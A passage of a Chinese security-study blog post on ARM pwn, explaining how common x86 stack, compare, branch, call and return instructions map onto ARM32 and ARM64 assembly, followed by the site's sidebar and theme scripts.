+<h3 id="x86-对应-ARM-的指令集："><a href="#x86-对应-ARM-的指令集：" class="headerlink" title="x86 对应 ARM 的指令集："></a>x86 对应 ARM 的指令集：</h3><p>对于习惯了 x86 汇编的安全研究者来说，初看 ARM 汇编可能会觉得有些啰嗦，尤其是 AArch64 完全移除了专门的 push 和 pop 指令。</p>
+<p>以下是这几个经典 x86 指令在 ARM32 和 ARM64 中的等效实现及底层逻辑：</p>
+<h4 id="1-push-压栈"><a href="#1-push-压栈" class="headerlink" title="1. push (压栈)"></a>1. push (压栈)</h4><p>x86 的 push 会自动递减栈指针并存入数据。ARM 通过多寄存器存取或带有回写机制的寻址来实现。</p>
+<ul>
+<li><strong>ARM32</strong>:<ul>
+<li><strong>常规写法</strong>: <code>PUSH {R0, R1, R2}</code> （可以一次性压入多个寄存器）。</li>
+<li><strong>底层等效</strong>: <code>STMDB SP!, {R0, R1, R2}</code> (Store Multiple Decrement Before)。意思是先把 SP 减小，然后再把寄存器的值存进去，最后的 <code>!</code> 表示将计算后的新地址写回 SP。</li>
+</ul>
+</li>
+<li><strong>ARM64</strong>: <strong>（没有 PUSH 指令）</strong><ul>
+<li>ARM64 强制要求栈指针在访问内存时必须保持16字节对齐。因此，通常使用 <code>STP</code> (Store Pair) 指令一次性压栈两个 64 位寄存器。</li>
+<li><strong>写法</strong>: <code>STP X0, X1, [SP, #-16]!</code>。含义：将 SP 减 16，然后把 X0 和 X1 存入该地址，最后的 <code>!</code> 表示将新地址写回 SP。如果只想压入一个寄存器，可以使用 <code>STR X0, [SP, #-16]!</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-pop-出栈"><a href="#2-pop-出栈" class="headerlink" title="2. pop (出栈)"></a>2. pop (出栈)</h4><p>与 <code>push</code> 对应，操作方向相反。</p>
+<ul>
+<li><strong>ARM32</strong>:<ul>
+<li><strong>常规写法</strong>: <code>POP {R0, R1, R2}</code>。</li>
+<li><strong>底层等效</strong>: <code>LDMIA SP!, {R0, R1, R2}</code> (Load Multiple Increment After)。先从 SP 指向的地址读取数据到寄存器，然后将 SP 增加，<code>!</code> 负责更新 SP。</li>
+</ul>
+</li>
+<li><strong>ARM64</strong>: <strong>（没有 POP 指令）</strong><ul>
+<li>使用 LDP (Load Pair) 配合后索引寻址。</li>
+<li><strong>写法</strong>: <code>LDP X0, X1, [SP], #16</code>。含义：先从 SP 当前指向的位置读取数据到 X0 和 X1，然后再把 SP 加上 16。如果是单个寄存器：<code>LDR X0, [SP], #16</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-cmp-比较"><a href="#3-cmp-比较" class="headerlink" title="3. cmp (比较)"></a>3. cmp (比较)</h4><p>原理与 x86 非常类似，都是执行减法但不保存结果，只更新状态寄存器CPSR &#x2F; PSTATE中的标志位（N, Z, C, V）</p>
+<ul>
+<li><strong>ARM32</strong>: <code>CMP R0, R1</code> ：计算 R0 - R1，更新 CPSR。</li>
+<li><strong>ARM64</strong>: <code>CMP X0, X1</code>。在底层，这其实是 <code>SUBS XZR, X0, X1</code> 的别名，将减法结果丢弃到零寄存器 XZR，并设置状态标志 <code>S</code>。</li>
+</ul>
+<h4 id="4-jmp-无条件跳转"><a href="#4-jmp-无条件跳转" class="headerlink" title="4. jmp (无条件跳转)"></a>4. jmp (无条件跳转)</h4><p>ARM 中称为分支 (Branch)。</p>
+<ul>
+<li><strong>ARM32</strong>:<ul>
+<li><code>B &lt;label&gt;</code>：相对跳转（通常用于函数内部的短跳）。</li>
+<li><code>BX Rm</code> (Branch and Exchange)：跳转到寄存器 Rm 中的地址。<strong>非常重要</strong>：如果 Rm 的最低位（LSB）为 1，处理器会切换到 Thumb 模式；如果为 0，则保持 ARM 模式。</li>
+</ul>
+</li>
+<li><strong>ARM64</strong>:<ul>
+<li><code>B &lt;label&gt;</code>：相对跳转。</li>
+<li><code>BR Xm</code> (Branch to Register)：绝对跳转到 Xm 中的地址。AArch64 取消了 Thumb 状态，所以不再有 <code>BX</code> 指令的状态切换概念。</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-call-函数调用"><a href="#5-call-函数调用" class="headerlink" title="5. call (函数调用)"></a>5. call (函数调用)</h4><p>x86 的 <code>call</code> 会自动将下一条指令的地址（返回地址）压入栈中，然后跳转。ARM 则是将返回地址保存到链接寄存器（LR）中。</p>
+<ul>
+<li><strong>ARM32</strong>:<ul>
+<li><code>BL &lt;label&gt;</code> (Branch with Link)：将下一条指令的地址放入 R14 (LR)，然后跳转到 label。</li>
+<li><code>BLX Rm</code>：将返回地址放入 LR，然后跳转到 Rm，并根据 Rm 的最低位决定是否切换 Thumb 状态。</li>
+</ul>
+</li>
+<li><strong>ARM64</strong>:<ul>
+<li><code>BL &lt;label&gt;</code>：将返回地址存入 X30 (LR)，跳转。</li>
+<li><code>BLR Xm</code> (Branch with Link to Register)：将返回地址存入 X30，跳转到寄存器 Xm 的地址。</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-leave-销毁栈帧"><a href="#6-leave-销毁栈帧" class="headerlink" title="6. leave (销毁栈帧)"></a>6. leave (销毁栈帧)</h4><p>x86 的 <code>leave</code> 等效于 <code>mov esp, ebp; pop ebp</code>。ARM 的函数尾声通常直接通过恢复寄存器来实现。</p>
+<ul>
+<li><strong>ARM32</strong>: 通常写为 <code>MOV SP, FP</code> 然后配合 <code>POP {FP}</code>（或者直接恢复更多局部变量）。</li>
+<li><strong>ARM64</strong>: 通常没有专用的宏指令，而是通过算术运算恢复栈空间，然后恢复 FP 和 LR：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV SP, X29               // 恢复栈顶指针</span><br><span class="line">LDP X29, X30, [SP], #16   // 弹出旧的 FP(X29) 和 LR(X30)</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-ret-函数返回"><a href="#7-ret-函数返回" class="headerlink" title="7. ret (函数返回)"></a>7. ret (函数返回)</h4><p>x86 的 ret 会从栈顶弹出一个地址并赋给 eip&#x2F;rip。ARM 则是将之前保存在 LR 中的地址赋值给 PC。</p>
+<ul>
+<li><strong>ARM32</strong>:<ul>
+<li>可以直接把 LR 挪给 PC：<code>MOV PC, LR</code> 或者 <code>BX LR</code>。</li>
+<li><strong>Pwn中最常见的形式</strong>：如果函数开头把 LR 压栈了<code>PUSH {..., LR}</code>，结尾通常会直接弹出到 PC：<code>POP {..., PC}</code>。这条指令是 ARM32 ROP 链的灵魂</li>
+</ul>
+</li>
+<li><strong>ARM64</strong>:<ul>
+<li>使用专门的 RET 指令。默认情况下 RET 会将 X30 (LR) 的值赋给 PC 从而实现返回。如果你想返回到其他寄存器指定的地址，可以写 <code>RET Xm</code>。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>基础知识的学习就先到这里吧  ^_^</p>
+<blockquote>
+<p>更新: 2026-05-07 19:56:53<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/ncbly2ipgy0qrz8g">https://www.yuque.com/idcm/wnemg9/ncbly2ipgy0qrz8g</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/HFTTC.github.io/tags/pwn/" rel="tag" title="pwn">pwn</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="MIPS-PWN" class="lazyload">
+        <a href="/HFTTC.github.io/2026/05/23/MIPS-PWN/index/" aria-label="前一篇: MIPS-PWN" title="前一篇: MIPS-PWN"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            MIPS-PWN
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="[CISCN 2024] ez_buf" class="lazyload">
+      <a href="/HFTTC.github.io/2026/05/23/Protobuf%E8%84%B1%E5%A3%B3%E4%BA%8C%E8%BF%9B%E5%88%B6/%5BCISCN2024%5Dez_buf/" aria-label="后一篇: [CISCN 2024] ez_buf"  title="后一篇: [CISCN 2024] ez_buf"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          [CISCN 2024] ez_buf
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        223.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        18:25
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ARM-PWN"><span class="toc-number">1.</span> <span class="toc-text">ARM-PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ARMPWN-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">ARMPWN 环境搭建与题目学习过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-qemu-user"><span class="toc-number">1.1.1.</span> <span class="toc-text">使用 qemu-user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-32-%E4%BD%8D%E5%92%8C-64-%E4%BD%8D-ARM-%E7%9A%84%E5%9F%BA%E7%A1%80%E8%BF%90%E8%A1%8C%E5%BA%93"><span class="toc-number">1.1.2.</span> <span class="toc-text">安装 32 位和 64 位 ARM 的基础运行库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C%E5%8D%B3%E5%8F%AF"><span class="toc-number">1.1.3.</span> <span class="toc-text">直接运行即可</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-%E8%B0%83%E8%AF%95"><span class="toc-number">1.1.4.</span> <span class="toc-text">gdb 调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-%E8%84%9A%E6%9C%AC"><span class="toc-number">1.1.5.</span> <span class="toc-text">python 脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E7%89%B9%E5%AE%9A%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.1.6.</span> <span class="toc-text">架构特定设置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARM-%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">ARM 架构基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81-ARM-32%E4%BD%8D-AArch32-ARMv7-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">一、 ARM 32位 (AArch32 &#x2F; ARMv7) 寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-ARM-64%E4%BD%8D-AArch64-ARMv8-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">二、 ARM 64位 (AArch64 &#x2F; ARMv8) 寄存器</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-%E5%AF%B9%E5%BA%94-ARM-%E7%9A%84%E6%8C%87%E4%BB%A4%E9%9B%86%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">x86 对应 ARM 的指令集：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-push-%E5%8E%8B%E6%A0%88"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. push (压栈)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-pop-%E5%87%BA%E6%A0%88"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. pop (出栈)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cmp-%E6%AF%94%E8%BE%83"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. cmp (比较)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-jmp-%E6%97%A0%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. jmp (无条件跳转)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-call-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. call (函数调用)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-leave-%E9%94%80%E6%AF%81%E6%A0%88%E5%B8%A7"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. leave (销毁栈帧)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-ret-%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. ret (函数返回)</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "ARM-PWN",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/ARM-PWN/index/",
+          excerpt: "",
+          description: "",
+          stripContent: "ARM-PWNARMPWN 环境搭建与题目学习过程：使用 qemu-user123sudo apt updatesudo apt install qemu-user-static binfmt-supportsudo apt install libc6-armel-cross libc6-arm64-cross # 安装 32 位和 64 位的交叉编译库（为了运行时的动态链接）  安装 32 位和 64 位 ARM 的基础运行库1234567# 1. 安装 QEMU 用户模式模拟器sudo ap",
+          date: "Sat May 23 2026 02:46:44 GMT+0800",
+          updated: "Sat May 23 2026 02:58:43 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
